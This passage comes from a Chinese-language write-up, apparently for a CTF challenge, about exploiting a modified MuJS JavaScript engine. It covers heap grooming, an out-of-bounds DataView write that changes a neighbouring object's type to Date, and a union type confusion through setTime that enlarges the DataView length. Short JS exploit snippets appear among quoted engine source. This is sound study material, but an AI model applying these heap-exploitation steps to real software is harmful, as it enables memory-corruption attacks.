b <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>首次进入<code>jsB_new_DataView</code>的时候，堆环境很乱，重要的点如下:</p> <ul><li>tcache和fastbin中大量存在0x60 chunk，</li> <li>unsorted bin中存在大堆快，可能存在一些0xb0/0xc0之类较小的堆快。</li></ul> <p>思路大概是， 尝试一直从这个大堆快中获取内存，这样内存是挨着的，可以达到要求。</p> <p>我们的<code>js_Object</code>结构体本身大小为0x68， 申请0x70左右的堆快，然后这个<code>u.dataview.data</code>位置的堆块大小我们可以控制。</p> <p>另外， 在<code>jsR_run</code>函数打印opcode出来，在<code>js_malloc</code>函数打印堆快的变化，</p> <p>这个call函数调用了<code>DataView</code>创建函数，我们data大小也是0x68, 在setvar时， 会有另一个malloc,</p> <p><img src="https://s2.loli.net/2022/03/03/boqkCdjrKTLJvuM.png" alt="image-20220303154900605"></p> <p>对应位置:</p> <p><img src="https://s2.loli.net/2022/03/03/GaHPvzwO9276mfp.png" alt="image-20220303155136832"></p> <p>应该是形成一个<code>value-object</code>的映射。</p> <p>函数逻辑也比较简单，如果可以查找到这个变量， 则进行修改，这里修改可能存在有<code>setter</code>的情况那么通过<code>setter</code>进行修改，</p> <p>如果找不到，则将搜索的环境向外扩张一层，</p> <blockquote><p>这也比较好理解， 如果函数内局部变量找不到就找全局变量， 这么个意思。</p></blockquote> <p>如果真没有，那么<code>jsR_setpropertty</code>函数创建新的。这个要创建的<code>js_Property</code>就是这个0x40的堆快申请。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">js_setvar</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  js_Environment <span class="token operator">*</span>E <span class="token operator">=</span> J<span class="token operator">-&gt;</span>E<span class="token punctuation">;</span>
  <span class="token keyword">do</span> <span class="token punctuation">{</span>
    js_Property <span class="token operator">*</span>ref <span class="token operator">=</span> <span class="token function">jsV_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> E<span class="token operator">-&gt;</span>variables<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token operator">-&gt;</span>setter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> ref<span class="token operator">-&gt;</span>setter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> E<span class="token operator">-&gt;</span>variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">js_call</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">js_pop</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>ref<span class="token operator">-&gt;</span>atts <span class="token operator">&amp;</span> JS_READONLY<span class="token punctuation">)</span><span class="token punctuation">)</span>
        ref<span class="token operator">-&gt;</span>value <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">stackidx</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>J<span class="token operator">-&gt;</span>strict<span class="token punctuation">)</span>
        <span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;'%s' is read-only&quot;</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    E <span class="token operator">=</span> E<span class="token operator">-&gt;</span>outer<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>J<span class="token operator">-&gt;</span>strict<span class="token punctuation">)</span>
    <span class="token function">js_referenceerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;assignment to undeclared variable '%s'&quot;</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">jsR_setproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>G<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>于是， 我们创建的变量的时候内存分配如下:</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>obj = malloc(0x68) // js_Object
data = malloc(xx) // from user 
var = malloc(0x40) // js_Perperty 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>我们期望 data和下一个obj挨着，主要思路就是使用 <code>unsorted bin</code>中的大堆快进行切割，</p> <p>有一下两个思路</p> <ul><li>预留出来几个0x50大小，给<code>js_Property</code>， 让data和obj来每次切割大堆快。</li> <li>重复使用变量，使用<code>js_setvar</code>中的逻辑，这样会复用原来的<code>js_Property</code>， 不会申请堆快。</li></ul> <p>最开始我尝试使用第一个思路，但是因为后续js代码的修改，导致编译不同， 这些小一些的<code>unsorted bin</code>不稳定存在， 这样利用就有一定概率性，甚至可能一直不行。于是使用第二个思路，这个构造起来也比较简单。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// heap : a-a.data-b</span>

a<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> xxx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// b is a xx type</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>这个可以稳定利用。</p> <h3 id="类型混淆"><a href="#类型混淆" class="header-anchor">#</a> 类型混淆</h3> <p>其实这里思路也很简单，我们目前使用<code>Dataview</code>， 使用的是<code>js_object.u.dataview</code>的这部分</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
		    <span class="token class-name">uint32_t</span> length<span class="token punctuation">;</span>
		    <span class="token class-name">uint8_t</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> dataview<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>每次内存读写的检测都是这个<code>self.u.dataview.length</code>，</p> <p>同时这个位置的<code>obj.u</code>为<code>union</code>， 天然的一个类型混淆，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>	<span class="token keyword">union</span> <span class="token punctuation">{</span>
		<span class="token keyword">int</span> boolean<span class="token punctuation">;</span>
		<span class="token keyword">double</span> number<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">;</span>
			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> s<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> a<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			js_Function <span class="token operator">*</span>function<span class="token punctuation">;</span>
			js_Environment <span class="token operator">*</span>scope<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> f<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
			js_CFunction function<span class="token punctuation">;</span>
			js_CFunction constructor<span class="token punctuation">;</span>
			<span class="token keyword">int</span> length<span class="token punctuation">;</span>
			<span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
			js_Finalize finalize<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> c<span class="token punctuation">;</span>
		js_Regexp r<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			js_Object <span class="token operator">*</span>target<span class="token punctuation">;</span>
			js_Iterator <span class="token operator">*</span>head<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> iter<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
			<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>tag<span class="token punctuation">;</span>
			<span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>
			js_HasProperty has<span class="token punctuation">;</span>
			js_Put put<span class="token punctuation">;</span>
			js_Delete delete<span class="token punctuation">;</span>
			js_Finalize finalize<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> user<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">{</span>
		    <span class="token class-name">uint32_t</span> length<span class="token punctuation">;</span>
		    <span class="token class-name">uint8_t</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
		<span class="token punctuation">}</span> dataview<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> u<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>我查看了这些类型对应的方法，主要是<code>set</code>之类的方法。</p> <p>在<code>jsB_initdate</code>中找到了这些方法，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setTime&quot;</span><span class="token punctuation">,</span> Dp_setTime<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setMilliseconds&quot;</span><span class="token punctuation">,</span> Dp_setMilliseconds<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCMilliseconds&quot;</span><span class="token punctuation">,</span> Dp_setUTCMilliseconds<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setSeconds&quot;</span><span class="token punctuation">,</span> Dp_setSeconds<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCSeconds&quot;</span><span class="token punctuation">,</span> Dp_setUTCSeconds<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setMinutes&quot;</span><span class="token punctuation">,</span> Dp_setMinutes<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCMinutes&quot;</span><span class="token punctuation">,</span> Dp_setUTCMinutes<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setHours&quot;</span><span class="token punctuation">,</span> Dp_setHours<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCHours&quot;</span><span class="token punctuation">,</span> Dp_setUTCHours<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setDate&quot;</span><span class="token punctuation">,</span> Dp_setDate<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCDate&quot;</span><span class="token punctuation">,</span> Dp_setUTCDate<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setMonth&quot;</span><span class="token punctuation">,</span> Dp_setMonth<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCMonth&quot;</span><span class="token punctuation">,</span> Dp_setUTCMonth<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setFullYear&quot;</span><span class="token punctuation">,</span> Dp_setFullYear<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Date.prototype.setUTCFullYear&quot;</span><span class="token punctuation">,</span> Dp_setUTCFullYear<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>而后发现他们全部转入<code>js_setdate</code>函数</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">js_setdate</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">double</span> t<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	js_Object <span class="token operator">*</span>self <span class="token operator">=</span> <span class="token function">js_toobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token operator">-&gt;</span>type <span class="token operator">!=</span> JS_CDATE<span class="token punctuation">)</span>
		<span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;not a date&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>number <span class="token operator">=</span> <span class="token function">TimeClip</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_pushnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> self<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>这里修改<code>self-&gt;u.number</code>其实和<code>self-&gt;u.dataview.length</code> 在同一位置，</p> <p>那么通过这些函数我们都可以修改<code>length</code>， 并将内存读写范围扩大。</p> <p>这里选择了最可控的一个</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Dp_setTime</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">js_setdate</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">js_tonumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>这里其实还存在一个小问题</p> <p>number 定义为<code>double number;</code>， 占8字节， legnth定义为 <code>uint32_t length;</code>, 占后4字节。当然在dataview中会进行对齐，所以length前4字节被摸除。</p> <p>这个赋值的时候通过<code>TimeClip</code>函数修改了:</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">double</span> <span class="token function">TimeClip</span><span class="token punctuation">(</span><span class="token keyword">double</span> t<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isfinite</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> NAN<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">8.64e15</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> NAN<span class="token punctuation">;</span>
	<span class="token keyword">return</span> t <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token operator">-</span>t<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">floor</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>如果满足规则， 则调用<code>floor</code>函数，并返回，这个函数作用就是清除小数位，</p> <p>double内存中保存为如下的状态：</p> <p><img src="https://s2.loli.net/2022/03/03/P12AjfbqunOKIY6.png" alt="image-20220303164408712"></p> <p>sign符号位表示正负， exponet是指数位 表示2^e， fraction是尾数位，</p> <p>一般是 (-1)^ sign * (1 + fraction) * 2^e ，</p> <p>目前清楚小数位以后，这个fraction很可能只有高位存在一部分，那么我们使用length时的第四字节全是0,</p> <p>这时候要让这个数据尽可能的大， 这样整数部分够多，会转换为指数位很大并且尾数位也很多的情况，我们的length就有数据了。</p> <h3 id="函数调用"><a href="#函数调用" class="header-anchor">#</a> 函数调用</h3> <p>另一个问题出现在函数调用的时候， 我们目前exp如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// heap : c-c.data-d</span>

a<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// b is a Date type</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>如果现在使用<code>b.setTime</code>的话，是不行的，因为这些类型对应的函数是通过原型进行调用的。</p> <p>我们可以稍微patch代码， 增加一些信息打印，然后看到opcode等， 可以观察到这个<code>setUint8</code>函数调用过程,</p> <p>首先获取变量a, 然后重复一份， 容纳后获取prop<code>setUint8</code>，后面是栈顶两个元素<code>prop</code>和<code>object</code>换位变成<code>prop-object</code>， 然后压栈整数， 这是我们的参数，然后调用函数，</p> <p><img src="https://s2.loli.net/2022/03/03/5x6ZEsrziya1S4n.png" alt="image-20220303172427674"></p> <p>那么这个函数调用，也是走的<code>js_call</code>， 我们可以回顾下，目标函数其实是这个obj， n表示参数个数，那么这个<code>-n-2</code>的距离，在我们分析的这个例子中就是这个prop <code>setUint8</code>，</p> <p><img src="https://s2.loli.net/2022/03/03/aTMgc5OLy4rXuqw.png" alt="image-20220303172654644"></p> <p>于是跟进一下这个 opcode，</p> <p><img src="https://s2.loli.net/2022/03/03/ZyrE93TtuD8nP2J.png" alt="image-20220303172809644"></p> <p>主要还是<code>jsR_getproperty</code>函数， 如下 转入<code>jsR_hasproperty</code>函数，</p> <p>这个函数首先根据类型判断了一些直接进行操作的方法，</p> <p>然后如果不是内置的， 则需要拓展，进入<code>jsV_getproperty</code>函数，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">jsR_getproperty</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> js_Object <span class="token operator">*</span>obj<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">jsR_hasproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">js_pushundefined</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">jsR_hasproperty</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> js_Object <span class="token operator">*</span>obj<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  js_Property <span class="token operator">*</span>ref<span class="token punctuation">;</span>
  <span class="token keyword">int</span> k<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>type <span class="token operator">==</span> JS_CARRAY<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">&quot;length&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">js_pushnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>type <span class="token operator">==</span> JS_CSTRING<span class="token punctuation">)</span> 
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  
  ref <span class="token operator">=</span> <span class="token function">jsV_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token operator">-&gt;</span>getter<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> ref<span class="token operator">-&gt;</span>getter<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">js_call</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">js_pushvalue</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> ref<span class="token operator">-&gt;</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
